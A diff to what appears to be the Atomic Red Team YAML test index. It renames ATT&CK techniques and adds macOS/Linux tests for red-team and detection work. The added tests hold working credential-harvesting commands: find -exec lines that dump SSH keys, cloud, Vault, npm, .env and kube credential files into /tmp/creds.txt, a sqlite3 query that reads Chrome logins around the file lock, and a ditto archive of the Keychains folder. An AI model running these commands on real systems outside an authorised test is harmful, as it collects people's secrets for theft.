@@ -432,7 +432,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.620Z'
-      name: File/Path Exclusions
+      name: 'Hide Artifacts: File/Path Exclusions'
       description: |-
         Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)
 
@@ -451,6 +451,7 @@ stealth:
       - macOS
       - Windows
       x_mitre_version: '2.0'
+      identifier: T1564.012
     atomic_tests: []
   T1216.001:
     technique:
@@ -4695,6 +4696,7 @@ stealth:
       - macOS
       - Windows
       x_mitre_version: '2.0'
+      identifier: T1027.017
     atomic_tests: []
   T1542.002:
     technique:
@@ -8714,7 +8716,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.723Z'
-      name: SyncAppvPublishingServer
+      name: 'System Script Proxy Execution: SyncAppvPublishingServer'
       description: "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution
         of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands.
         SyncAppvPublishingServer.vbs is a Visual Basic script associated with how
@@ -8746,6 +8748,7 @@ stealth:
       x_mitre_platforms:
       - Windows
       x_mitre_version: '2.0'
+      identifier: T1216.002
     atomic_tests: []
   T1027.018:
     technique:
@@ -14977,6 +14980,7 @@ privilege-escalation:
       - macOS
       - Windows
       x_mitre_version: '1.6'
+      identifier: T1068
     atomic_tests: []
   T1546:
     technique:
@@ -17970,7 +17974,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:22.302Z'
-      name: Server Software Component
+      name: Shared Modules
       description: |-
         Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).
 
@@ -33848,6 +33852,55 @@ collection:
         cleanup_command: 'rm -rf #{input_folder}'
         name: bash
         elevation_required: false
+    - name: Data Compressed - macOS - ditto Archive of a Sensitive Directory
+      auto_generated_guid: 2794f321-55c4-4484-9eef-0557996f715a
+      description: |
+        Uses `ditto`, Apple's own copy and archive utility, to compress a directory holding sensitive data into a
+        single zip archive, which is the staging step that normally precedes exfiltration.
+
+        `ditto` is the tool macOS infostealers reach for rather than `zip` or `tar`, because it preserves resource
+        forks and extended attributes, so the archive survives a round trip with macOS metadata intact. CyberProof's
+        AMOS analysis describes the malware aggregating Keychain files, browser credentials and wallet data and
+        compressing them "into a single archive named `osalogging.zip` within the `/tmp` directory using native macOS
+        utilities like `ditto`". [LOOBins](https://www.loobins.io/binaries/ditto/) lists the same
+        `ditto -c -k --sequesterRsrc --keepParent` form under Collection and Exfiltration, and notes there was no
+        detection content for the binary at the time of writing.
+
+        The default source is the user's Keychains directory, which exists on every macOS install and is the highest
+        value target of the real technique. Both the source and the destination are input arguments, so the test can
+        be pointed at a directory of your choosing instead.
+
+        Upon successful execution, a zip archive is created at the output path and its size is printed.
+      supported_platforms:
+      - macos
+      input_arguments:
+        source_path:
+          description: Directory that gets archived
+          type: path
+          default: "$HOME/Library/Keychains"
+        output_file:
+          description: Path of the archive that is created
+          type: path
+          default: "/tmp/T1560.001_ditto_archive.zip"
+      dependencies:
+      - description: 'The source directory #{source_path} must exist
+
+          '
+        prereq_command: 'if [ -d "#{source_path}" ]; then exit 0; else exit 1; fi
+
+          '
+        get_prereq_command: 'mkdir -p #{source_path}
+
+          '
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'ditto -c -k --sequesterRsrc --keepParent "#{source_path}" "#{output_file}"
+
+          '
+        cleanup_command: 'rm -f "#{output_file}"
+
+          '
   T1113:
     technique:
       type: attack-pattern
@@ -38735,7 +38788,7 @@ defense-impairment:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.623Z'
-      name: Windows Host Firewall
+      name: 'Disable or Modify System Firewall: Windows Host Firewall'
       description: "Adversaries may disable or modify the Windows host firewall to
         bypass controls limiting network usage. This can include disabling the Windows
         host firewall entirely, suppressing specific profiles (domain, private, public),
@@ -38761,6 +38814,7 @@ defense-impairment:
       x_mitre_platforms:
       - Windows
       x_mitre_version: '1.0'
+      identifier: T1686.003
     atomic_tests: []
   T1689:
     technique:
@@ -44257,6 +44311,63 @@ credential-access:
           rm "/tmp/T1555.003_Login Data" >/dev/null 2>&1
           rm "/tmp/T1555.003_Login Data For Account" >/dev/null 2>&1
         name: sh
+    - name: Query Chrome Login Data In Place with sqlite3 - MacOS
+      auto_generated_guid: 29d0c390-3cbc-4e4e-a52b-a1350ed836b7
+      description: |
+        Reads Google Chrome's `Login Data` SQLite database in place with the Apple-signed `/usr/bin/sqlite3`
+        binary, instead of copying the database somewhere else first. The saved origin URLs and usernames are
+        written to the output file. Passwords stay in the `password_value` BLOB column and remain encrypted with
+        the Chrome Safe Storage key, so this test collects the credential index rather than plaintext secrets.
+
+        The `?immutable=1` URI parameter is the part that matters. Chrome holds a lock on the database while it
+        is running, and a plain `sqlite3 "<path>" "SELECT ..."` fails with `Error: in prepare, database is locked (5)`.
+        Opening the file through a `file:` URI with `immutable=1` reads it without taking a lock, so the test works
+        against a live browser and does not need to kill Chrome first, which is what the published LOOBins one-liner
+        for Firefox does.
+
+        This matters for detection because `sqlite3` ships with macOS and is signed by Apple, so controls that key
+        on code signing trust or on an unknown binary touching the profile directory do not fire on it.
+
+        [LOOBins sqlite3](https://www.loobins.io/binaries/sqlite3/) documents the same binary being used against
+        browser cookie databases. [Red Canary](https://redcanary.com/blog/threat-intelligence/clipping-silver-sparrows-wings/)
+        documented macOS malware invoking the `sqlite3` CLI, and
+        [Jamf](https://www.jamf.com/blog/crashstealer-macos-infostealer-analysis/) documented a macOS infostealer
+        working around the same database lock through the SQLite backup API.
+
+        Upon successful execution, the output file contains one line per saved login in the form
+        `origin_url|username_value`. If Chrome has no saved logins the file is created and left empty.
+      supported_platforms:
+      - macos
+      input_arguments:
+        chrome_profile:
+          description: Name of the Chrome profile directory to read
+          type: string
+          default: Default
+        output_file:
+          description: Path the query results are written to
+          type: path
+          default: "/tmp/T1555.003_chrome_logins.txt"
+      dependencies:
+      - description: 'Chrome''s Login Data database must exist for profile #{chrome_profile}
+
+          '
+        prereq_command: 'if [ -f "$HOME/Library/Application Support/Google/Chrome/#{chrome_profile}/Login
+          Data" ]; then exit 0; else exit 1; fi
+
+          '
+        get_prereq_command: |
+          brew install --cask google-chrome
+          xattr -d com.apple.quarantine "/Applications/Google Chrome.app"
+          open -a "Google Chrome" && sleep 5 && killall -KILL "Google Chrome"
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          sqlite3 "file:$HOME/Library/Application Support/Google/Chrome/#{chrome_profile}/Login Data?immutable=1" "SELECT origin_url, username_value FROM logins;" > "#{output_file}"
+          cat "#{output_file}"
+        cleanup_command: 'rm -f "#{output_file}"
+
+          '
   T1557.003:
     technique:
       type: attack-pattern
@@ -44441,15 +44552,20 @@ credential-access:
           description: Path where to start searching from.
           type: path
           default: "/"
-        output_file:
-          description: Output file containing locations of SSH key files
-          type: path
-          default: "/tmp/keyfile_locations.txt"
+        filename:
+          description: SSH Key file to search for
+          type: string
+          default: id_rsa
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
         command: |
-          find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}
+          find #{search_path} -name "#{filename}" -type f #{optional_flags} 2>/dev/null
           exit 0
-        cleanup_command: 'rm #{output_file}
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -44504,6 +44620,37 @@ credential-access:
           find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \;
           exit 0
         cleanup_command: 'rm -rf #{output_folder}
+
+          '
+        name: sh
+    - name: Find TLS private key files
+      auto_generated_guid: 5e417277-0ae7-4ad5-a3e8-0fa27c122b29
+      description: |
+        Find TLS private key files on the filesystem by extension.
+        Extensions include *.key, *.pem, *.p12, and *.pfx
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        file_extensions:
+          description: Space-separated TLS key file extensions to search for
+          type: string
+          default: "*.key *.pem *.p12 *.pfx"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'for file_extension in #{file_extensions}; do find #{file_path} -name
+          "$file_extension" -type f #{optional_flags} 2>/dev/null; done
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -45106,7 +45253,7 @@ credential-access:
         output_file:
           description: Path where captured results will be placed
           type: path
-          default: "~/loot.txt"
+          default: "/tmp/loot.txt"
         bash_history_grep_args:
           description: grep arguments that filter out specific commands we want to
             capture
@@ -45119,6 +45266,39 @@ credential-access:
       executor:
         command: 'cat #{bash_history_filename} | grep #{bash_history_grep_args} >
           #{output_file}
+
+          '
+        cleanup_command: 'rm -f #{output_file}
+
+          '
+        name: sh
+    - name: Search Through Zsh History
+      auto_generated_guid: 8f2765a8-e795-438b-a102-5e25a7adcce1
+      description: 'Search through zsh history for specific commands we want to capture
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: path
+          default: "/tmp/loot.txt"
+        zsh_history_grep_args:
+          description: grep arguments that filter out specific commands we want to
+            capture
+          type: string
+          default: "-e '-p ' -e 'pass' -e 'ssh'"
+        zsh_history_filename:
+          description: Path of the zsh history file to capture
+          type: path
+          default: "~/.zsh_history"
+      executor:
+        command: 'cat #{zsh_history_filename} | grep #{zsh_history_grep_args} > #{output_file}
+
+          '
+        cleanup_command: 'rm -f #{output_file}
 
           '
         name: sh
@@ -45201,8 +45381,12 @@ credential-access:
           description: Path to search
           type: string
           default: "/"
+        filename:
+          description: Name of the AWS credential file to search for
+          type: string
+          default: credentials
       executor:
-        command: 'find #{file_path}/.aws -name "credentials" -type f 2>/dev/null
+        command: 'find #{file_path} -path ''*/.aws/#{filename}'' -type f 2>/dev/null
 
           '
         name: sh
@@ -45237,8 +45421,8 @@ credential-access:
         name: sh
     - name: Find and Access Github Credentials
       auto_generated_guid: da4f751a-020b-40d7-b9ff-d433b7799803
-      description: 'This test looks for .netrc files (which stores github credentials
-        in clear text )and dumps its contents if found.
+      description: 'Find .netrc files, which store GitHub credentials in clear text,
+        and dump their contents if found.
 
         '
       supported_platforms:
@@ -45248,14 +45432,25 @@ credential-access:
         file_path:
           description: Path to search
           type: string
-          default: "/home"
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: ".netrc"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
-        name: bash
-        elevation_required: false
-        command: 'for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do
-          echo $file ; cat $file ; done
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
 
           '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
     - name: Find Azure credentials
       auto_generated_guid: a8f6148d-478a-4f43-bc62-5efee9f931a4
       description: 'Find local Azure credentials from file, defaults to using / as
@@ -45270,9 +45465,21 @@ credential-access:
           description: Path to search
           type: string
           default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: msal_token_cache.json
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
-        command: 'find #{file_path}/.azure -name "msal_token_cache.json" -o -name
-          "accessTokens.json" -type f 2>/dev/null
+        command: 'find #{file_path} -path ''*/.azure/#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -45290,9 +45497,21 @@ credential-access:
           description: Path to search
           type: string
           default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: credentials.db
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
-        command: 'find #{file_path}/.config/gcloud -name "credentials.db" -o -name
-          "access_tokens.db" -type f 2>/dev/null
+        command: 'find #{file_path} -path ''*/.config/gcloud/#{filename}'' -type f
+          #{optional_flags} 2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -45312,6 +45531,393 @@ credential-access:
           default: "/"
       executor:
         command: 'find #{file_path}/.oci/sessions -name "token" -type f 2>/dev/null
+
+          '
+        name: sh
+    - name: Access Travis CI Config File
+      auto_generated_guid: 5312c7c3-775b-4437-a8b0-914b30cfebd4
+      description: 'Find Travis CI configuration files (.travis.yml), which may contain
+        credentials, secrets, or sensitive environment variables.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: ".travis.yml"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Access Gitlab CI Config File
+      auto_generated_guid: 98618067-a2c7-4d4b-9c89-403a90f43656
+      description: 'Find GitLab CI configuration files (.gitlab-ci.yml), which may
+        contain credentials, secrets, or sensitive environment variables.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: ".gitlab-ci.yml"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Terraform credential files
+      auto_generated_guid: c3372ae9-b9bf-427a-b330-cb04fecb9c1d
+      description: 'Find Terraform credential files which may contain sensitive values
+        such as API keys, passwords, and infrastructure secrets. Searches for both
+        terraform.tfvars and terraform.tfstate.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filenames:
+          description: Space-separated Terraform credential filenames to search for
+          type: string
+          default: terraform.tfvars terraform.tfstate
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'for filename in #{filenames}; do find #{file_path} -name "$filename"
+          -type f #{optional_flags} 2>/dev/null; done
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Docker credentials
+      auto_generated_guid: 5a668739-3a2f-4265-895f-c0e1e0b09eaa
+      description: 'Find local Docker credentials from file, defaults to using / as
+        the look path.
+
+        '
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: config.json
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -path ''*/.docker/#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find HashiCorp Vault token files
+      auto_generated_guid: 2951c09f-b4f9-4248-ba75-6373709ebd55
+      description: 'Find HashiCorp Vault token files (~/.vault-token), which contain
+        plaintext Vault tokens that grant access to secrets stored in Vault.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: ".vault-token"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Access Drone CI Config File
+      auto_generated_guid: a11f22fb-a037-4cc2-bcfc-a133b287aa1b
+      description: 'Find Drone CI configuration files (.drone.yml), which may contain
+        credentials, secrets, or sensitive environment variables used in Drone CI/CD
+        pipelines.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: ".drone.yml"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Search for Git Credential Files
+      auto_generated_guid: c8367142-cbb0-47a4-96c7-ff9969fd64ea
+      description: |
+        Searches the specified directory for a git credential file, which
+        may contain plaintext credentials, access tokens, or credential helper
+        configurations. Example files include .git-credentials and .gitconfig.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: directory to search under
+          type: string
+          default: "/"
+        filename:
+          description: git credential file to search for
+          type: string
+          default: ".git-credentials"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find .env Files Containing Application Credentials
+      auto_generated_guid: bcf8e58a-1cb7-4988-9227-3d3c70751811
+      description: |
+        Searches common web application and service directories for .env files
+        (.env, .env.local, .env.production, .env.development, .env.staging) that may
+        contain credentials such as API keys, database passwords, and service secrets.
+        Adversaries targeting web servers or containerized environments search for these
+        files after gaining host access to harvest application-level credentials.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Space-separated list of directories to search
+          type: string
+          default: "/home /Users /root /opt /srv /var/www /app /data /var/lib /tmp"
+        filename:
+          description: ".env filename pattern to search for"
+          type: string
+          default: ".env*"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'find #{file_path} -maxdepth 6 -name "#{filename}" -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+    - name: Find database credential files
+      auto_generated_guid: e62bccc4-0200-47e9-b40a-4ea5328495b3
+      description: 'Find user-level database credential files. Examples include ~/.pgpass,
+        ~/.my.cnf, and ~/.mongorc.js.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filenames:
+          description: Space-separated database credential filenames to search for
+          type: string
+          default: ".pgpass .my.cnf .mongorc.js"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: |
+          for filename in #{filenames}; do
+            find #{file_path} -name "$filename" -type f #{optional_flags} 2>/dev/null
+          done
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find npm registry credential files
+      auto_generated_guid: 2a24627b-061b-43e6-bece-a5b0638841dd
+      description: 'Find .npmrc files, which may contain plaintext npm registry authentication
+        tokens.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: ".npmrc"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Access Jenkinsfile
+      auto_generated_guid: 18318786-e0c0-4bdf-979f-f022e6f5f2ef
+      description: 'Find Jenkinsfiles, which may contain credentials, secrets, or
+        sensitive environment variables used in Jenkins CI/CD pipelines.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: Jenkinsfile
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Kubernetes user configuration files
+      auto_generated_guid: 14575d1f-16b3-4a0b-8986-540e42e6a6cc
+      description: 'Find Kubernetes user configuration files (~/.kube/config), which
+        contain API server addresses, client certificates, and bearer tokens that
+        grant access to the Kubernetes cluster. Defaults to using / as the search
+        path.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -path ''*/.kube/config'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -48698,13 +49304,15 @@ discovery:
           type: path
           default: "/tmp/T1082.txt"
       executor:
-        command: "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat
-          /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then
-          cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ];
-          then cat /etc/issue >> #{output_file}; fi\nif [ -f /etc/os-release ]; then
-          cat /etc/os-release >> #{output_file}; fi\nuptime >> #{output_file}\ncat
-          #{output_file} 2>/dev/null\n"
-        cleanup_command: 'rm #{output_file} 2>/dev/null
+        command: |
+          uname -a >> "#{output_file}"
+          if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> "#{output_file}"; fi
+          if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> "#{output_file}"; fi
+          if [ -f /etc/issue ]; then cat /etc/issue >> "#{output_file}"; fi
+          if [ -f /etc/os-release ]; then cat /etc/os-release >> "#{output_file}"; fi
+          uptime >> "#{output_file}"
+          cat "#{output_file}" 2>/dev/null
+        cleanup_command: 'rm "#{output_file}" 2>/dev/null
 
           '
         name: sh
@@ -50758,6 +51366,40 @@ discovery:
 
           '
         name: sh
+    - name: Enumerate SSH Configuration
+      auto_generated_guid: 6fc814cb-16d1-43e6-80b3-2ff2a45250d1
+      description: |
+        SSH metadata files (authorized_keys, known_hosts, config) can be used to
+        discover remote systems and trust relationships. known_hosts
+        reveals previously connected servers, config exposes host aliases and jump
+        proxies, and authorized_keys shows which public keys are trusted for login.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        search_path:
+          description: Directory to search under
+          type: string
+          default: "/"
+        filename:
+          description: SSH metadata file to search for
+          type: string
+          default: known_hosts
+        output_file:
+          description: File to write results to
+          type: path
+          default: "/tmp/ssh_enum.txt"
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'find #{search_path} -name "#{filename}" -type f 2>/dev/null | while
+          read -r file; do echo "=== $file ===" >> #{output_file}; cat "$file" >>
+          #{output_file}; done
+
+          '
+        cleanup_command: 'rm -f #{output_file}
+
+          '
   T1046:
     technique:
       type: attack-pattern
